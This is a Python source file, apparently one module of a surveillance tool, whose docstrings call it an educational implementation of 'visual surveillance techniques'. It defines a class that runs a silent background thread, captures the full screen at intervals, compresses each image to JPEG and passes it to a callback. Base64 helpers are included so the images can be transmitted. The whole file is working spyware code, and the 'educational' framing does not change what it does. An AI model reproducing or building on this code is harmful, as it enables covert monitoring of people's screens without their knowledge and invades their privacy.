"""
Screenshot Capture Module
Educational implementation of screen capture for surveillance
"""

import threading
import time
import io
import base64
from datetime import datetime
from pathlib import Path

try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    try:
        import pyscreenshot as ImageGrab
        SCREENSHOT_AVAILABLE = True
    except ImportError:
        SCREENSHOT_AVAILABLE = False


class ScreenshotCapture:
    """
    Periodically captures screenshots
    Educational purpose: Demonstrates visual surveillance techniques
    """

    def __init__(self, callback, interval=300, quality=50, max_size=(800, 600)):
        """
        Initialize screenshot capture

        Args:
            callback (function): Function to call with screenshot data
                                 Signature: callback(timestamp, image_data, size)
            interval (int): Seconds between screenshots
            quality (int): JPEG quality (1-100, lower = smaller file)
            max_size (tuple): Maximum dimensions (width, height) for resizing
        """
        self.callback = callback
        self.interval = interval
        self.quality = quality
        self.max_size = max_size
        self.running = False
        self.thread = None

    def start(self):
        """Start periodic screenshots"""
        if not SCREENSHOT_AVAILABLE:
            print("[!] PIL/pyscreenshot not available - screenshots disabled")
            return False

        if self.running:
            return False

        self.running = True
        self.thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.thread.start()
        return True

    def stop(self):
        """Stop capturing screenshots"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)

    def _capture_loop(self):
        """Main capture loop"""
        while self.running:
            try:
                self.capture_screenshot()
            except Exception as e:
                print(f"[!] Screenshot error: {e}")

            # Wait for interval
            for _ in range(self.interval):
                if not self.running:
                    break
                time.sleep(1)

    def capture_screenshot(self):
        """Capture a single screenshot"""
        try:
            # Capture screen
            screenshot = ImageGrab.grab()

            # Resize if needed
            if screenshot.size[0] > self.max_size[0] or screenshot.size[1] > self.max_size[1]:
                screenshot.thumbnail(self.max_size)

            # Convert to JPEG in memory
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=self.quality, optimize=True)
            image_data = buffer.getvalue()
            buffer.close()

            # Call callback with data
            timestamp = datetime.now()
            self.callback(timestamp, image_data, screenshot.size)

            return True

        except Exception as e:
            print(f"[!] Failed to capture screenshot: {e}")
            return False

    def capture_to_file(self, filepath):
        """Capture screenshot and save to file"""
        try:
            screenshot = ImageGrab.grab()

            if screenshot.size[0] > self.max_size[0] or screenshot.size[1] > self.max_size[1]:
                screenshot.thumbnail(self.max_size)

            screenshot.save(filepath, format='JPEG', quality=self.quality, optimize=True)
            return True

        except Exception as e:
            print(f"[!] Failed to save screenshot: {e}")
            return False

    @staticmethod
    def encode_image_base64(image_data):
        """Encode image data to base64 for transmission"""
        return base64.b64encode(image_data).decode('utf-8')

    @staticmethod
    def save_base64_image(base64_data, filepath):
        """Decode base64 and save to file"""
        try:
            image_data = base64.b64decode(base64_data)
            Path(filepath).write_bytes(image_data)
            return True
        except Exception as e:
            print(f"[!] Failed to save base64 image: {e}")
            return False
